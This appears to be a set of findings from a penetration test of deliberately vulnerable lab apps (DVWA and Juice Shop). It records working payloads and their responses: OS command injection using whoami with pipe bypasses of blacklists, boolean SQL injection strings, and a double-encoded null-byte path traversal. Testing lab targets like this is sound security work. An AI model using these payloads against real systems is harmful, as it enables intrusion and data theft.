request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip='127.0.0.1; whoami', Submit=Submit (session dvwa_admin, security=low)

findings.title: Unauthenticated user-feedback listing exposes author data (email PII only partially masked)
findings.response_evidence: HTTP 200 application/json, 8 records returned without authentication (fields UserId, id, comment, rating, createdAt, updatedAt). Author emails are NOT disclosed in full: comments carry masked fragments only, e.g. id=1 "...Highly recommended! (***in@juice-sh.op)", id=2 "(***@juice-sh.op)", id=3 "(***der@juice-sh.op)", id=4 "(***ereum@juice-sh.op)". Anonymous entries have UserId null and "(anonymous)". No full author email addresses observed, so the CWE-359 email-PII criterion is not met. Records are unauthenticated and contain partial PII fragments (partial email local-part fragments and UserId values), which may warrant a separate low-severity note. Recommend Coordinator decide whether to keep as partial exposure.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve package.json.bak

findings.response_evidence:
Raw request: HTTP 403, body "Error: Only .md and .pdf files are allowed!". Null-byte bypass: HTTP 200 application/octet-stream with restricted backup contents: "{

  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}, "devDependencies": {...}". The %2500 (double-encoded NUL) plus .md suffix defeats the extension check.

findings.title: [security=medium] SQL Injection (numeric boolean) in POST /vulnerabilities/sqli/ id parameter
findings.response_evidence: [security=medium] Level confirmed: page reads 'Security level set to medium' / 'Security level is currently: medium'. TRUE payload id='1 OR 1=1' returned HTTP 200 with 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' returned HTTP 200 with zero records (only 'User ID: 1 2 3 4 5' header, no 'First name/Surname' rows). Behavioral difference confirmed: TRUE yields multiple seeded surnames (Brown, Me, Picasso, Smith, admin), FALSE yields none.

findings.title: [security=medium] OS Command Injection via pipe bypass in POST /vulnerabilities/exec/ ip parameter
findings.response_evidence: [security=medium] Level confirmed as medium before test. POST /vulnerabilities/exec/ with ip='127.0.0.1| whoami' returned HTTP 200; the 'Ping a device' output block contains the line 'www-data' (the web-process identity). Payload used pipe operator because ';' and '&&' are blacklisted at medium. Output reflects OS command execution.

findings.title: /security.php CWE-639 candidate - level-setting control, not a vulnerability
request_sequence: GET http://dvwa/security.php -> 'Security level is currently: medium'
findings.response_evidence: Rejected as a finding. /security.php has no object-reference parameter (no basket ID or user ID), so CWE-639 does not apply. It was used only to set the DVWA security level to medium; the subsequent GET reported 'Security level is currently: medium' and 'Security level set to medium'. Note: session_info.security_level continued to report 'low' in tool metadata, which is a tool-side lag, not evidence of the server state. This was not a vulnerability by itself.

findings.title: [security=high] SQL Injection in DVWA SQLi via server-side session id (boolean-based)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token e86651fd338ded7aaacbaa4dd9cffc14; page showed 'Security level is currently: medium'
GET http://dvwa/security.php -> 'Security level set to high' / 'Security Level: high' (new user_token 0084d3a1d13d2a4061f2d8c1afa584af)
findings.response_evidence: [security=high] Security level confirmed high on GET /security.php ('Security level set to high', 'Security Level: high'). Note: the tool's session_info field still displayed 'low' on subsequent calls, but the page content itself confirms high. TRUE payload id=1' OR '1'='1' # via session-input.php, then GET /vulnerabilities/sqli/ returned 5 records: ID: 1' OR '1'='1' # First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2' # via session-input.php, then GET /vulnerabilities/sqli/ returned zero records (no 'ID:' / 'Surname:' rows; only 'Click here to change your ID' and footer). Multiple seeded surnames on TRUE vs zero on FALSE = boolean-based SQLi confirmed at high.

findings.title: OS Command Injection via ip parameter (pipe without space) [security=high]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page body: 'Security level is currently: high'
findings.response_evidence: [security=high] Payload ip=127.0.0.1|whoami returned HTTP 200 with the Ping output block containing 'www-data' (pre-block text: "www-data") under 'Enter an IP address:'. Page footer shows 'Security Level: high'. Control ip=127.0.0.1 returned only the normal PING output (4 packets, 0% loss) and no 'www-data' string, so the 'www-data' output is attributable to the injected whoami command. Level verification: security.php body reads 'Security level is currently: high.' (the session_info metadata field still reports 'low', which is stale tool metadata and contradicts the page body; the page body and the footer both say high). No re-POST of security level was needed.

findings.title: Unauthenticated user-feedback endpoint exposes author data (emails masked only)
findings.response_evidence: HTTP 200 application/json without authentication, 8 feedback records. Author-linked comments contain only masked emails, e.g. id 1: "...Highly recommended! (***in@juice-sh.op)"; id 2: "(***@juice-sh.op)"; id 3: "(***der@juice-sh.op)"; id 4: "(***ereum@juice-sh.op)". Anonymous entries have UserId null and "(anonymous)". No full email address appears in the JSON. Records expose UserId, id, comment, rating, createdAt, updatedAt. Criterion for confirmation (unmasked author email PII without auth) is NOT met; partial masked email fragments and unauthenticated record access are present, so the finding is inconclusive for full PII disclosure.
